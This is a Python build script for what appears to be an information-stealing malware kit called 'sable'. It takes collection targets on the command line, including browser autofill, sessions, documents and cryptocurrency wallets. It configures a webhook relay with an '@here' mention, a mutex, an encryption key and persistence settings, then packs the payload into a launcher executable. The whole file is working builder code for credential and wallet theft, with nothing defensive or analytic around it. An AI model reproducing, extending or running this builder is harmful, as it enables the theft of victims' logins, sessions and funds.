"""Build an artifact pointed at a real relay, with source flags chosen from argv.

  python live_build_remote.py <endpoint> <destination> [source[,source...]]

Sources named are switched on, everything else off. ``all`` means everything.
Self-remove stays off so the artifact survives for inspection.
"""

from __future__ import annotations

import sys
from pathlib import Path

ROOT = Path(r"C:\Users\Kuzenee\Desktop\55555\sable")
sys.path.insert(0, str(ROOT))

from core import forge, seal  # noqa: E402
from core.schema import (  # noqa: E402
    SCHEMA_VERSION,
    RelayConfig,
    RunConfig,
    SourceConfig,
)

ENDPOINT = sys.argv[1]
DESTINATION = Path(sys.argv[2])
WANTED = sys.argv[3] if len(sys.argv) > 3 else "all"
KIND = sys.argv[4] if len(sys.argv) > 4 else "https"
PING = sys.argv[5] if len(sys.argv) > 5 else ""
MENTION = sys.argv[6] if len(sys.argv) > 6 else "@here"
KEEP = (sys.argv[7] if len(sys.argv) > 7 else "").lower() in {"1", "yes", "on", "true"}
PERSIST = (sys.argv[8] if len(sys.argv) > 8 else "").lower() in {"1", "yes", "on", "true"}
HOURS = int(sys.argv[9]) if len(sys.argv) > 9 else 0

NAMES = ("autofill", "documents", "wallets", "sessions", "system", "browsers")

if WANTED == "all":
    enabled = set(NAMES)
else:
    enabled = {part.strip() for part in WANTED.split(",") if part.strip()}
    unknown = enabled - set(NAMES)
    if unknown:
        raise SystemExit(f"unknown source(s): {', '.join(sorted(unknown))}")

sources = SourceConfig(**{name: name in enabled for name in NAMES})

cfg = RunConfig(
    schema_version=SCHEMA_VERSION,
    mutex=r"Global\SableRemoteProbe",
    seal_key="bench-remote-probe-key",
    relay=RelayConfig(kind=KIND, endpoint=ENDPOINT, ping=PING, mention=MENTION),
    sources=sources,
    self_remove=False,
    ballast_mb=0,
    keep_local=KEEP,
    persist=PERSIST,
    persist_hours=HOURS,
)

archive = forge.payload(ROOT, cfg)
print(f"sources        {', '.join(sorted(enabled))}")
print(f"keep_local     {KEEP}")
print(f"persist        {PERSIST} {HOURS}h")
print(f"payload        {len(archive)} bytes")

sealed = seal.seal(archive, cfg.seal_key)
STUB = ROOT / "tools" / "dist" / "sable-launcher.exe"

DESTINATION.parent.mkdir(parents=True, exist_ok=True)
forge.build(cfg, sealed, DESTINATION, mode="exe", stub=STUB)
print(f"artifact       {DESTINATION}  {DESTINATION.stat().st_size} bytes")
print(f"endpoint       {ENDPOINT.split('/webhooks/')[0]}/.../{ENDPOINT[-12:]}")
